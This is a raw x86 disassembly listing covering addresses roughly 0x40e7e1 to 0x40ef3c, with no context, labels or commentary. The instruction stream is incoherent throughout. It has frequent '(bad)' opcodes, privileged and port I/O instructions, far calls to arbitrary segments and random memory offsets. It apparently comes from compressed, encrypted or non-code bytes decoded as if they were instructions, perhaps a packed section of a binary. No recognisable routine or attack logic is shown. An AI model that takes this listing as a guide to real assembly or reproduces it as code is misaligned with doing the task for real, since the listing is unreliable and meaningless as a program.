  40e7e1:	push   ss
  40e7e2:	stc    
  40e7e3:	jne    0x40e837
  40e7e5:	inc    ebx
  40e7e6:	fsub   DWORD PTR [ebp-0xc]
  40e7e9:	add    ah,0xe5
  40e7ec:	aaa    
  40e7ed:	mov    dl,0xd3
  40e7ef:	in     al,dx
  40e7f0:	loopne 0x40e830
  40e7f2:	push   edx
  40e7f3:	mov    ch,0x96
  40e7f5:	arpl   WORD PTR [esi-0x3113393d],bx
  40e7fb:	fisub  DWORD PTR [esi+0x373aca30]
  40e801:	jl     0x40e835
  40e803:	fldcw  WORD PTR [ebx+0x3fe52283]
  40e809:	sti    
  40e80a:	rol    dl,1
  40e80c:	mov    esi,0x20e2bcc4
  40e811:	or     BYTE PTR [eax],dl
  40e813:	mov    al,0x61
  40e815:	mov    WORD PTR [ecx+0x114c6b09],ds
  40e81b:	mov    esi,0xd58b6825
  40e820:	adc    al,0xe2
  40e822:	mov    ds:0x9bc2be5c,eax
  40e827:	daa    
  40e828:	loope  0x40e7d5
  40e82a:	popf   
  40e82b:	gs mov edx,?
  40e82e:	es cmp ah,bl
  40e831:	cld    
  40e832:	cld    
  40e833:	fdiv   DWORD PTR [ebx+0x48ee3d1f]
  40e839:	hlt    
  40e83a:	call   0xc066:0x7dedc645
  40e841:	in     al,dx
  40e842:	ds or  al,0x10
  40e845:	jecxz  0x40e7c7
  40e847:	es fs push ebp
  40e84a:	xchg   ebp,eax
  40e84b:	xchg   DWORD PTR [edx-0x537b94b6],edi
  40e851:	retf   0x8f77
  40e854:	imul   esp,ebx,0x32e07009
  40e85a:	retf   0xe091
  40e85d:	fbstp  TBYTE PTR [edi+0x6a]
  40e860:	(bad)  
  40e862:	arpl   WORD PTR [ebx],di
  40e864:	push   eax
  40e865:	pop    ecx
  40e866:	sahf   
  40e867:	loop   0x40e870
  40e869:	imul   eax,DWORD PTR [edx+0x55c8d089],0xc4b34bf1
  40e873:	or     eax,0x73acdbe7
  40e878:	sbb    edi,esi
  40e87a:	stc    
  40e87b:	add    cl,BYTE PTR ds:0xef819104
  40e881:	(bad)  
  40e882:	adc    DWORD PTR [eax-0x68db868f],0xb2383f3
  40e88c:	xchg   esp,eax
  40e88d:	sub    bh,ah
  40e88f:	sti    
  40e890:	xchg   ebx,eax
  40e891:	aad    0x51
  40e893:	jb     0x40e835
  40e895:	dec    eax
  40e896:	sbb    eax,0x3cb09b33
  40e89b:	in     al,dx
  40e89c:	add    DWORD PTR [ecx+0x6dca4a53],esp
  40e8a2:	fld    DWORD PTR [esi]
  40e8a4:	xchg   esp,eax
  40e8a5:	shl    DWORD PTR [edi-0x6d],0x6
  40e8a9:	pop    eax
  40e8aa:	mov    BYTE PTR [eax-0x71881871],ch
  40e8b0:	cmp    al,0x3f
  40e8b2:	dec    edi
  40e8b3:	and    DWORD PTR [ebp-0x4b],edi
  40e8b6:	jno    0x40e887
  40e8b8:	ja     0x40e8a4
  40e8ba:	mov    bl,0x75
  40e8bc:	or     dl,dh
  40e8be:	pop    ds
  40e8bf:	cmovb  esi,DWORD PTR [eax-0x9]
  40e8c3:	aas    
  40e8c4:	mov    dh,0x51
  40e8c6:	pop    edx
  40e8c7:	inc    esi
  40e8c8:	ja     0x40e852
  40e8ca:	ins    BYTE PTR es:[edi],dx
  40e8cb:	jno    0x40e8ca
  40e8cd:	xor    eax,0x368555ba
  40e8d2:	dec    ebp
  40e8d3:	inc    ecx
  40e8d4:	inc    esp
  40e8d5:	mov    bh,0x6c
  40e8d7:	dec    ebx
  40e8d8:	jbe    0x40e8a8
  40e8da:	into   
  40e8db:	adc    al,0x15
  40e8dd:	add    eax,0x4b7f2fbe
  40e8e2:	sahf   
  40e8e3:	lea    edx,[ecx+0x6e]
  40e8e6:	jne    0x40e8fa
  40e8e8:	sub    al,0x1c
  40e8eb:	pop    edx
  40e8ec:	jg     0x40e898
  40e8ee:	mov    bh,0xf0
  40e8f0:	neg    esi
  40e8f2:	lea    ecx,[eax-0x7d371e0c]
  40e8f8:	xchg   esi,eax
  40e8f9:	retf   
  40e8fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8fb:	dec    esi
  40e8fc:	ins    BYTE PTR es:[edi],dx
  40e8fd:	mov    es,WORD PTR [esi]
  40e8ff:	add    ch,dl
  40e901:	xchg   DWORD PTR [edi-0x56443fe6],ebp
  40e907:	gs jle 0x40e90e
  40e90a:	xchg   ecx,eax
  40e90b:	test   DWORD PTR [edx],ebx
  40e90d:	ins    DWORD PTR es:[edi],dx
  40e90e:	mov    ecx,0x65ec092a
  40e913:	cwde   
  40e914:	cmp    ah,BYTE PTR [esi]
  40e916:	das    
  40e917:	cmp    al,0xcb
  40e919:	push   edi
  40e91a:	sub    ebx,DWORD PTR [ebx]
  40e91c:	enter  0x8ebe,0xd
  40e920:	mov    dh,0x7f
  40e922:	and    BYTE PTR [ebp-0x18],dl
  40e925:	cmp    BYTE PTR [eax],dl
  40e927:	popa   
  40e928:	test   ah,al
  40e92a:	mov    WORD PTR [esi-0x67],?
  40e92d:	inc    esp
  40e92e:	mov    esp,0x76c2a136
  40e933:	lahf   
  40e934:	or     al,dh
  40e936:	mov    dl,0x72
  40e938:	or     bl,0x15
  40e93b:	xchg   ebx,eax
  40e93c:	cld    
  40e93d:	dec    edx
  40e93e:	mov    WORD PTR [esi],gs
  40e940:	mov    ecx,0x740e6829
  40e945:	cmp    BYTE PTR [ecx],0xc4
  40e948:	jge    0x40e95d
  40e94a:	(bad)  
  40e94b:	shl    DWORD PTR [ebx+0x3d],1
  40e94e:	adc    ebp,edi
  40e950:	inc    esi
  40e951:	test   eax,0xecdd0821
  40e956:	cmc    
  40e957:	xor    ecx,esp
  40e959:	std    
  40e95a:	push   ebp
  40e95b:	push   0xb
  40e95d:	inc    edx
  40e95e:	inc    esp
  40e95f:	add    cl,BYTE PTR [ebx-0x3d861bbb]
  40e965:	sub    al,0x9a
  40e967:	jp     0x40e9a1
  40e969:	mov    dl,0x3f
  40e96b:	push   ecx
  40e96c:	int3   
  40e96d:	dec    edi
  40e96e:	inc    eax
  40e96f:	cwde   
  40e970:	mov    es,WORD PTR [eax+0x4]
  40e973:	and    bl,BYTE PTR [eax+0x44]
  40e976:	ficom  WORD PTR [ebx+0x8fec08b]
  40e97c:	rol    BYTE PTR [edi],0x98
  40e97f:	push   ds
  40e980:	ins    BYTE PTR es:[edi],dx
  40e981:	pushf  
  40e982:	ja     0x40e9a2
  40e984:	add    BYTE PTR [esi-0x1999f7af],0xce
  40e98b:	(bad)  
  40e98d:	mov    eax,ds:0x20196ac0
  40e992:	leave  
  40e993:	push   esp
  40e994:	imul   eax,DWORD PTR [edx+ecx*8+0x7ad74221],0xf7487ef3
  40e99f:	lea    edi,[eax+edx*2]
  40e9a2:	xor    dh,BYTE PTR ds:0x1aa49b0f
  40e9a8:	jae    0x40e933
  40e9aa:	mov    ?,WORD PTR [ebp-0x2550cbb3]
  40e9b0:	dec    ecx
  40e9b1:	sbb    ecx,DWORD PTR [ebp-0x6c860ecc]
  40e9b7:	pusha  
  40e9b8:	mov    dh,0x99
  40e9ba:	mov    dh,0x3c
  40e9bc:	lods   eax,DWORD PTR ds:[esi]
  40e9bd:	mov    al,ds:0x48962705
  40e9c2:	or     eax,ecx
  40e9c4:	mov    esi,0xaf09611c
  40e9c9:	jo     0x40e990
  40e9cb:	mov    esi,0x7f5e7a5b
  40e9d0:	outs   dx,BYTE PTR ds:[esi]
  40e9d1:	inc    edx
  40e9d2:	arpl   WORD PTR [esi+0x64],bx
  40e9d5:	lahf   
  40e9d6:	sub    BYTE PTR [ebx+0x6dc268b5],dl
  40e9dc:	in     al,0x53
  40e9de:	inc    edi
  40e9df:	imul   esp,DWORD PTR [ecx-0x5ea6653b],0xffffffa5
  40e9e6:	xchg   edx,eax
  40e9e7:	add    esi,DWORD PTR [eax+0xeeb598a]
  40e9ed:	imul   ecx,DWORD PTR [edi+0x36],0xffffff98
  40e9f1:	std    
  40e9f2:	mov    bh,0x36
  40e9f4:	sbb    al,0x99
  40e9f6:	add    dh,BYTE PTR [ebx-0x3f21089b]
  40e9fc:	test   al,0xad
  40e9fe:	jl     0x40ea61
  40ea00:	adc    eax,0x8a1f8491
  40ea05:	cs out dx,eax
  40ea07:	add    al,0xfc
  40ea09:	push   0x7a
  40ea0b:	mov    dl,0x16
  40ea0d:	retf   
  40ea0e:	jp     0x40ea8b
  40ea10:	and    BYTE PTR [eax-0x51eae87],cl
  40ea16:	pop    ebx
  40ea17:	push   ebp
  40ea18:	pop    edx
  40ea19:	nop
  40ea1a:	js     0x40e9cd
  40ea1c:	(bad)  
  40ea1d:	jmp    0x40ea00
  40ea1f:	ret    0x9433
  40ea22:	test   al,0x21
  40ea24:	push   0xffffffa3
  40ea26:	mov    DWORD PTR [ebx+0x20ca7086],esp
  40ea2c:	pop    ss
  40ea2d:	lods   eax,DWORD PTR ds:[esi]
  40ea2e:	cs loopne 0x40ea4f
  40ea31:	add    DWORD PTR [ecx],0xffffffd1
  40ea34:	dec    esp
  40ea35:	xchg   BYTE PTR ds:0x686aa120,bh
  40ea3b:	push   edi
  40ea3c:	call   0x3d0b:0xc9cebc55
  40ea43:	repnz gs inc ebp
  40ea46:	and    dl,BYTE PTR [esi]
  40ea48:	jp     0x40ea38
  40ea4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea4b:	dec    ecx
  40ea4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea4d:	sbb    al,0x85
  40ea4f:	add    DWORD PTR [ebx],edx
  40ea51:	xchg   ebx,eax
  40ea52:	cmc    
  40ea53:	(bad)  
  40ea54:	(bad)  
  40ea55:	icebp  
  40ea56:	inc    ebp
  40ea57:	inc    edi
  40ea58:	nop
  40ea59:	call   0xd0ff702b
  40ea5e:	mov    ebp,0x79437e6e
  40ea63:	or     dl,ah
  40ea65:	test   esp,ebx
  40ea67:	adc    al,0xe
  40ea69:	mov    cl,0x51
  40ea6b:	ss inc ebp
  40ea6d:	(bad)  
  40ea6e:	leave  
  40ea6f:	xor    al,0x4
  40ea71:	xchg   esp,eax
  40ea72:	mov    eax,ds:0xa88033ae
  40ea77:	cmp    BYTE PTR [edx+eiz*8-0x13d30029],al
  40ea7e:	fmul   DWORD PTR [edx-0xf]
  40ea81:	push   esp
  40ea82:	adc    ebp,DWORD PTR [edi-0x4a1a071e]
  40ea88:	dec    ebp
  40ea89:	mov    eax,ds:0x980ce1e2
  40ea8e:	pop    edx
  40ea8f:	pop    esi
  40ea90:	push   esi
  40ea91:	je     0x40ea81
  40ea93:	mov    edi,0x3c85da69
  40ea98:	push   0x78
  40ea9a:	les    edi,FWORD PTR [ebp+eax*8-0x3c98f561]
  40eaa1:	rcpps  xmm2,XMMWORD PTR [esi]
  40eaa4:	rol    esi,0x75
  40eaa7:	fmul   QWORD PTR [ecx]
  40eaa9:	or     dh,cl
  40eaab:	jo     0x40eb2c
  40eaad:	leave  
  40eaae:	(bad)  
  40eaaf:	call   0x191756a5
  40eab4:	fadd   DWORD PTR [ecx-0x1e278d3b]
  40eaba:	pop    eax
  40eabb:	pop    esp
  40eabc:	xchg   edx,eax
  40eabd:	ror    BYTE PTR [edx],0x44
  40eac0:	jnp    0x40eab4
  40eac2:	mov    ch,0x9c
  40eac4:	xor    DWORD PTR [ebp-0x57],esp
  40eac7:	xor    DWORD PTR [eax],esp
  40eac9:	or     eax,0xbef657fa
  40eace:	test   BYTE PTR ds:0xea918ef1,bl
  40ead4:	fs and eax,0x830524b7
  40eada:	push   esi
  40eadb:	mov    ds:0xcdd8eb4c,eax
  40eae0:	jl     0x40eac7
  40eae2:	mov    ch,0x67
  40eae4:	icebp  
  40eae5:	and    BYTE PTR [ebp+0x6d],cl
  40eae8:	retf   0x2748
  40eaeb:	xchg   edi,ebx
  40eaed:	jge    0x40eab7
  40eaef:	inc    edx
  40eaf0:	mov    cl,BYTE PTR [ebx+0xa]
  40eaf3:	mov    eax,ds:0x7b4670b3
  40eaf8:	inc    ebx
  40eaf9:	pop    es
  40eafa:	jl     0x40eb56
  40eafc:	fild   WORD PTR [ebp+0x7f]
  40eaff:	sbb    ebp,0xffffff90
  40eb02:	xchg   edi,eax
  40eb03:	addr16 pop es
  40eb05:	jmp    0x1b32:0x3a3f9307
  40eb0c:	ins    DWORD PTR es:[edi],dx
  40eb0d:	(bad)  
  40eb0e:	sahf   
  40eb0f:	push   es
  40eb10:	(bad)  
  40eb12:	lock xchg edi,eax
  40eb14:	ja     0x40eb86
  40eb16:	inc    BYTE PTR [edi]
  40eb18:	mov    dl,0x23
  40eb1a:	and    ch,BYTE PTR [esi+0x45965ec2]
  40eb20:	and    dh,ch
  40eb22:	pop    es
  40eb23:	push   cs
  40eb24:	ss inc esp
  40eb26:	mov    DWORD PTR [edx],eax
  40eb28:	push   ecx
  40eb29:	fbld   TBYTE PTR [ebp-0x4c]
  40eb2c:	lds    esp,FWORD PTR [ebx+0x2e5018cd]
  40eb32:	scas   al,BYTE PTR es:[edi]
  40eb33:	or     DWORD PTR [esi-0x7d6c74f3],edi
  40eb39:	jge    0x40eacd
  40eb3b:	popa   
  40eb3c:	ins    DWORD PTR es:[edi],dx
  40eb3d:	sbb    eax,0x1e45c582
  40eb42:	lahf   
  40eb43:	aaa    
  40eb44:	sub    ebp,eax
  40eb46:	cli    
  40eb47:	push   edx
  40eb48:	les    ecx,FWORD PTR [ecx-0x25acca17]
  40eb4e:	dec    edi
  40eb4f:	(bad)  
  40eb50:	sub    ebx,DWORD PTR ds:0x4142170a
  40eb56:	mov    cl,0xb1
  40eb58:	pop    ss
  40eb59:	adc    ecx,DWORD PTR [ebx+eax*4+0x6c]
  40eb5d:	loop   0x40eb35
  40eb5f:	and    edx,edx
  40eb61:	mov    ds:0x87a8cfd3,al
  40eb66:	fisttp DWORD PTR [edi-0x6a]
  40eb69:	(bad)  
  40eb6a:	neg    BYTE PTR [esi+0x2c]
  40eb6d:	pop    edi
  40eb6e:	push   ds
  40eb6f:	mov    ebp,0x1aba3181
  40eb74:	dec    ecx
  40eb75:	mov    cl,0xc3
  40eb77:	sti    
  40eb78:	test   DWORD PTR [esp+eiz*2+0x3d067495],edi
  40eb7f:	sub    eax,0xd5f2e4e2
  40eb84:	adc    al,0xa7
  40eb86:	mov    ebx,0x829ea49
  40eb8b:	or     eax,0x24175695
  40eb90:	pop    es
  40eb91:	in     al,0x2f
  40eb93:	inc    esp
  40eb94:	pushf  
  40eb95:	out    dx,al
  40eb96:	lods   al,BYTE PTR ds:[esi]
  40eb97:	(bad)  
  40eb98:	xor    ecx,DWORD PTR [edi]
  40eb9a:	push   edx
  40eb9b:	xchg   ebx,eax
  40eb9c:	add    ebx,eax
  40eb9e:	(bad)  [eax]
  40eba0:	iret   
  40eba1:	lea    edi,[edi-0x79]
  40eba4:	xor    BYTE PTR [ebx+0x69289b19],dh
  40ebaa:	mov    edx,0xf5b9b215
  40ebaf:	mov    ds:0x81496b2e,eax
  40ebb4:	pop    es
  40ebb5:	inc    esi
  40ebb6:	in     al,0x17
  40ebb8:	push   ss
  40ebb9:	xchg   esp,eax
  40ebba:	cmp    DWORD PTR [esi-0x4d],esi
  40ebbd:	cmp    DWORD PTR [ebp-0x41692852],ebp
  40ebc3:	pop    esp
  40ebc4:	jbe    0x40eb72
  40ebc6:	dec    esi
  40ebc7:	es jl  0x40eb85
  40ebca:	xor    esi,DWORD PTR [esi+edx*1+0x43]
  40ebce:	fisttp QWORD PTR [esi+esi*1]
  40ebd1:	addr16 xor eax,0xced846be
  40ebd7:	pop    edi
  40ebd8:	or     BYTE PTR [edx-0x54],cl
  40ebdb:	stos   DWORD PTR es:[edi],eax
  40ebdc:	call   0xbfa0a717
  40ebe1:	jne    0x40ebe8
  40ebe3:	jns    0x40eb6a
  40ebe5:	ss stc 
  40ebe7:	mov    es,WORD PTR ds:0x2c47785c
  40ebed:	ins    DWORD PTR es:[edi],dx
  40ebee:	hlt    
  40ebef:	pop    esp
  40ebf0:	fisttp DWORD PTR [edi+0x5971a27e]
  40ebf6:	popa   
  40ebf7:	loop   0x40eb8c
  40ebf9:	pop    ecx
  40ebfa:	xchg   esp,eax
  40ebfb:	xchg   edi,eax
  40ebfc:	dec    esp
  40ebfd:	cmc    
  40ebfe:	pop    es
  40ebff:	cmp    al,0x47
  40ec01:	fnstenv [esi]
  40ec03:	xchg   esp,eax
  40ec04:	sbb    ch,bl
  40ec06:	stos   BYTE PTR es:[edi],al
  40ec07:	jp     0x40ebad
  40ec09:	inc    esp
  40ec0a:	and    al,0x51
  40ec0c:	jo     0x40ec30
  40ec0e:	push   edi
  40ec0f:	ret    0x3f21
  40ec12:	int    0x15
  40ec14:	pop    edi
  40ec15:	mov    al,ds:0xc72a2cf3
  40ec1a:	(bad)  
  40ec1b:	pop    ebx
  40ec1c:	fnsave [ecx-0x71]
  40ec1f:	dec    esp
  40ec20:	cmp    eax,0x62db57a4
  40ec25:	fcmovne st,st(0)
  40ec27:	mov    cl,0x12
  40ec29:	not    esp
  40ec2b:	dec    edx
  40ec2c:	stc    
  40ec2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec2e:	push   ebp
  40ec2f:	pop    edi
  40ec30:	jbe    0x40ec8c
  40ec32:	xor    ebx,DWORD PTR [edx+0x5e]
  40ec35:	aad    0xc2
  40ec37:	test   al,0x7e
  40ec39:	mov    bl,BYTE PTR [edi+0x78]
  40ec3c:	jge    0x40ec99
  40ec3e:	sbb    BYTE PTR [edi-0x210009e6],dh
  40ec44:	xchg   ecx,eax
  40ec45:	test   DWORD PTR [eax+0x571f439b],edx
  40ec4b:	cmp    eax,0xc76a03c0
  40ec50:	pop    es
  40ec51:	xor    BYTE PTR [esi+0x35e255f2],bl
  40ec57:	je     0x40ec71
  40ec59:	sbb    BYTE PTR [edi],ah
  40ec5b:	ins    BYTE PTR es:[edi],dx
  40ec5c:	repnz mov al,0x18
  40ec5f:	shl    BYTE PTR [ecx],0x64
  40ec62:	mov    edx,0x5d0891d8
  40ec67:	ffree  st(1)
  40ec69:	mov    ebx,0x26a90e92
  40ec6e:	fistp  QWORD PTR [ebp-0x56]
  40ec71:	xor    DWORD PTR [edx+0x142d7810],ebx
  40ec77:	sub    al,0xb6
  40ec79:	fadd   DWORD PTR [ebp+0x3a]
  40ec7c:	aad    0xeb
  40ec7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec7f:	test   DWORD PTR ds:0xdb980649,edi
  40ec85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec86:	dec    ebx
  40ec87:	jg     0x40ec81
  40ec89:	in     eax,0xf
  40ec8b:	sbb    BYTE PTR [ebx+0x33],dl
  40ec8e:	enter  0x60fb,0x4a
  40ec92:	(bad)  
  40ec93:	sbb    BYTE PTR [edx+0x1d],ah
  40ec96:	sbb    eax,0x36232732
  40ec9b:	dec    esi
  40ec9c:	cwde   
  40ec9d:	pop    eax
  40ec9e:	dec    eax
  40ec9f:	xchg   ebp,eax
  40eca0:	sbb    al,0x49
  40eca2:	dec    eax
  40eca3:	sub    ch,BYTE PTR [ecx-0xf]
  40eca6:	retf   
  40eca7:	xlat   BYTE PTR ds:[ebx]
  40eca8:	gs retf 0x2839
  40ecac:	cmp    ah,bh
  40ecae:	(bad)  
  40ecaf:	push   esp
  40ecb0:	(bad)  
  40ecb1:	push   es
  40ecb2:	or     DWORD PTR [eax-0x4b9f4a89],0x65
  40ecb9:	pop    ds
  40ecba:	or     ah,BYTE PTR [esi+ecx*1+0x14b90ef5]
  40ecc1:	js     0x40ed40
  40ecc3:	sbb    al,bl
  40ecc5:	sub    al,0xf7
  40ecc7:	mov    esi,0xcf314bf6
  40eccc:	lods   eax,DWORD PTR ds:[esi]
  40eccd:	add    bl,BYTE PTR [ebx+0xd]
  40ecd0:	mov    edi,0x65384954
  40ecd5:	fisttp WORD PTR [ecx+0x6d]
  40ecd8:	lahf   
  40ecd9:	sbb    ebx,DWORD PTR ds:0x70ff899a
  40ecdf:	mov    ebx,0x4ada6f96
  40ece4:	data16 hlt 
  40ece6:	retf   0x76f7
  40ece9:	mul    DWORD PTR [ecx]
  40eceb:	jb     0x40ec7e
  40eced:	mov    cl,0x4d
  40ecef:	xlat   BYTE PTR ds:[ebx]
  40ecf0:	aas    
  40ecf1:	mov    dl,ch
  40ecf3:	les    ecx,FWORD PTR [ecx-0x1621f36]
  40ecf9:	out    dx,eax
  40ecfa:	xchg   DWORD PTR [edi-0x3533ea67],esi
  40ed00:	and    BYTE PTR [edi-0x4dddfd5d],cl
  40ed06:	push   es
  40ed07:	shr    BYTE PTR [eax],cl
  40ed09:	add    eax,0x7a2b0e39
  40ed0e:	push   eax
  40ed0f:	loope  0x40ed40
  40ed11:	add    BYTE PTR [esi+0x37b90e10],al
  40ed17:	jl     0x40ed21
  40ed19:	cli    
  40ed1a:	sub    eax,0xe04255c1
  40ed1f:	jnp    0x40ed24
  40ed21:	mov    esi,0x7d6854e0
  40ed26:	jbe    0x40ecad
  40ed28:	call   0xd2bf7b5b
  40ed2d:	rcr    BYTE PTR [esp+ebp*8-0x6a],0x91
  40ed32:	jge    0x40ed6b
  40ed34:	cs ins DWORD PTR es:[edi],dx
  40ed36:	pop    ebp
  40ed37:	shl    BYTE PTR [esp+ecx*1-0xb1116ec],1
  40ed3e:	pop    ss
  40ed3f:	cwde   
  40ed40:	cld    
  40ed41:	neg    DWORD PTR [ecx-0xdc4cf7f]
  40ed47:	jg     0x40eda9
  40ed49:	sub    BYTE PTR [esp+eiz*8+0x64],dl
  40ed4d:	rcl    DWORD PTR [edx+0x1d0cd589],0x22
  40ed54:	xor    al,0xf8
  40ed56:	and    ch,al
  40ed58:	adc    ebx,DWORD PTR cs:0x46c716ca
  40ed5f:	jns    0x40eda4
  40ed61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed62:	les    esp,FWORD PTR [ebx]
  40ed64:	ret    0x664c
  40ed67:	mov    cl,0x56
  40ed69:	ja     0x40ecf9
  40ed6b:	mov    eax,ds:0x3e835e17
  40ed70:	mov    edi,0xba87552c
  40ed75:	dec    ecx
  40ed76:	hlt    
  40ed77:	nop
  40ed78:	lds    esp,FWORD PTR [ebx+ebx*2+0x5c]
  40ed7c:	push   0xf6e9a072
  40ed81:	arpl   WORD PTR ds:0x108d113a,sp
  40ed87:	mov    ah,al
  40ed89:	rcl    BYTE PTR [edi],0x12
  40ed8c:	mov    al,ds:0x18071157
  40ed91:	and    esp,DWORD PTR [esi+0x3b]
  40ed94:	push   ds
  40ed95:	ins    DWORD PTR es:[edi],dx
  40ed96:	icebp  
  40ed97:	mov    ch,0x9
  40ed99:	xchg   ebx,eax
  40ed9a:	(bad)  [edi]
  40ed9c:	clc    
  40ed9d:	fwait
  40ed9e:	out    dx,al
  40ed9f:	mov    dh,0xc1
  40eda1:	mov    dh,0x8f
  40eda3:	push   ebx
  40eda4:	xchg   DWORD PTR [ebx],ecx
  40eda6:	fwait
  40eda7:	retf   
  40eda8:	in     eax,0x57
  40edaa:	and    bl,BYTE PTR [esp+eiz*2-0x4f]
  40edae:	mov    ds:0x7156c73b,eax
  40edb3:	or     cl,dl
  40edb5:	jp     0x40ee03
  40edb7:	out    0xef,al
  40edb9:	inc    ebp
  40edba:	push   esp
  40edbb:	das    
  40edbc:	(bad)  
  40edbd:	jl     0x40ee17
  40edbf:	mul    BYTE PTR [esi+0x7742f9cf]
  40edc5:	sub    DWORD PTR [ebx+0x4ae461d5],eax
  40edcb:	repz bnd ret 0xe7d5
  40edd0:	mov    WORD PTR [ecx-0x18],?
  40edd3:	xchg   BYTE PTR [ebx],al
  40edd5:	cmp    BYTE PTR [ebp-0x1cf0f9c8],ah
  40eddb:	and    DWORD PTR [edi],edi
  40eddd:	pusha  
  40edde:	xchg   ebx,eax
  40eddf:	clc    
  40ede0:	push   0xfffffffe
  40ede2:	push   edx
  40ede3:	inc    ecx
  40ede4:	(bad)  
  40ede5:	jg     0x40ee01
  40ede7:	sbb    edi,DWORD PTR [ecx]
  40ede9:	pushf  
  40edea:	push   esi
  40edeb:	xlat   BYTE PTR ds:[ebx]
  40edec:	mov    bh,0xe6
  40edee:	sub    al,BYTE PTR [edi-0x4a]
  40edf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edf2:	mov    eax,ds:0x90ce782
  40edf7:	push   ecx
  40edf8:	outs   dx,BYTE PTR ds:[esi]
  40edf9:	mov    dl,0x87
  40edfb:	retf   
  40edfc:	adc    eax,0x5959437f
  40ee01:	das    
  40ee02:	push   ds
  40ee03:	cmp    edx,DWORD PTR [edx+0x6d9f943e]
  40ee09:	shl    BYTE PTR [ecx+0x2f],0x39
  40ee0d:	or     ebp,DWORD PTR [ebx]
  40ee0f:	hlt    
  40ee10:	add    BYTE PTR [edi+0x1e],ch
  40ee13:	push   ebp
  40ee14:	dec    esp
  40ee15:	popf   
  40ee16:	imul   esi,DWORD PTR [eax+0x268235dc],0xffffffe0
  40ee1d:	or     esp,0x331d5d8
  40ee23:	and    eax,0x39c5cb8
  40ee28:	xor    al,0x79
  40ee2a:	dec    ecx
  40ee2b:	sbb    al,0x70
  40ee2d:	aaa    
  40ee2e:	jp     0x40ee7b
  40ee30:	les    ecx,FWORD PTR [ecx-0x4c]
  40ee33:	data16 sbb al,0x9c
  40ee36:	mov    ebx,0xb5c723b5
  40ee3b:	mov    dl,0x4d
  40ee3d:	pop    ecx
  40ee3e:	xor    eax,0x7472931d
  40ee43:	jp     0x40edd0
  40ee45:	mov    ch,0x39
  40ee47:	mov    esi,0xba0d2aee
  40ee4c:	scas   al,BYTE PTR es:[edi]
  40ee4d:	dec    ebx
  40ee4e:	xor    BYTE PTR [ebx+0x26eee289],dl
  40ee54:	pop    esp
  40ee55:	loope  0x40ee2c
  40ee57:	bound  esp,QWORD PTR [esi+0x2065d8f4]
  40ee5d:	(bad)  
  40ee5f:	std    
  40ee60:	sub    BYTE PTR [edi+0x4c],0x1d
  40ee64:	lea    edi,[esi+edi*8+0x53]
  40ee68:	lahf   
  40ee69:	shr    BYTE PTR [ebx],cl
  40ee6b:	sub    ebp,esp
  40ee6d:	cmp    DWORD PTR [edi-0x49222930],esp
  40ee73:	mov    edi,0xa477a20a
  40ee78:	mov    eax,ds:0x14a10a93
  40ee7d:	add    DWORD PTR [esi],esp
  40ee7f:	fstp   DWORD PTR ds:0xe3308481
  40ee85:	sub    al,0x7c
  40ee87:	pop    edi
  40ee88:	push   eax
  40ee89:	data16 icebp 
  40ee8b:	dec    eax
  40ee8c:	push   es
  40ee8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee8e:	and    eax,0xec8b2fd9
  40ee93:	mov    DWORD PTR [esi],ebx
  40ee95:	push   0x73480344
  40ee9a:	ficomp WORD PTR [edx-0x1a9b66df]
  40eea0:	pushf  
  40eea1:	push   ecx
  40eea2:	js     0x40ee84
  40eea4:	pop    ds
  40eea5:	jmp    0x3518:0xa9741b1a
  40eeac:	stos   BYTE PTR es:[edi],al
  40eead:	mov    ebx,0xd65a7628
  40eeb2:	mov    ch,0x12
  40eeb4:	sbb    eax,0x4c2a5580
  40eeb9:	das    
  40eeba:	inc    edx
  40eebb:	data16 mov ah,0x2b
  40eebe:	jbe    0x40ef2a
  40eec0:	outs   dx,DWORD PTR ds:[esi]
  40eec1:	sbb    eax,DWORD PTR [edx+0x7b]
  40eec4:	int    0xb1
  40eec6:	or     DWORD PTR [edx-0x42],ecx
  40eec9:	dec    ecx
  40eeca:	jo     0x40ee9b
  40eecc:	ins    BYTE PTR es:[edi],dx
  40eecd:	pop    edi
  40eece:	mov    dl,0xb6
  40eed0:	mov    DWORD PTR [ebp-0x69],eax
  40eed3:	sub    esi,esp
  40eed5:	repz sub DWORD PTR [ebp-0x444e4d62],esp
  40eedc:	out    dx,eax
  40eedd:	dec    edi
  40eede:	lods   al,BYTE PTR ds:[esi]
  40eedf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eee0:	sbb    DWORD PTR [ebx],esi
  40eee2:	jmp    0x40ef5e
  40eee4:	inc    edi
  40eee5:	sbb    edx,DWORD PTR [ebp+0x287be86b]
  40eeeb:	adc    al,0x4e
  40eeed:	inc    edi
  40eeee:	xor    eax,0xeb8b73ef
  40eef3:	jb     0x40ef65
  40eef5:	lods   al,BYTE PTR ds:[esi]
  40eef6:	iret   
  40eef7:	mov    bl,0x87
  40eef9:	jb     0x40eef4
  40eefb:	adc    ecx,eax
  40eefd:	pop    ss
  40eefe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeff:	push   ebx
  40ef00:	cmp    eax,0xcdb3feee
  40ef05:	mov    esi,0xf4b6d611
  40ef0a:	cmp    BYTE PTR [ecx+0x17],cl
  40ef0d:	(bad)  
  40ef0e:	outs   dx,BYTE PTR ds:[esi]
  40ef0f:	cmp    esp,DWORD PTR [ebx+0xd]
  40ef12:	test   eax,0x1862822a
  40ef17:	push   edi
  40ef18:	sub    BYTE PTR [edi+0x4a],dl
  40ef1b:	leave  
  40ef1c:	pusha  
  40ef1d:	or     al,0x65
  40ef1f:	or     al,0x77
  40ef21:	mov    bh,ah
  40ef23:	adc    DWORD PTR [esp+eax*2],esi
  40ef26:	in     eax,dx
  40ef27:	sar    ch,cl
  40ef29:	data16 int3 
  40ef2b:	mov    ds:0xb6603a7e,al
  40ef30:	daa    
  40ef31:	jae    0x40ef0d
  40ef33:	pop    esp
  40ef34:	(bad)  
  40ef35:	xor    eax,0xa92dc156
  40ef3a:	sahf   
  40ef3b:	into   
  40ef3c:	inc    eax
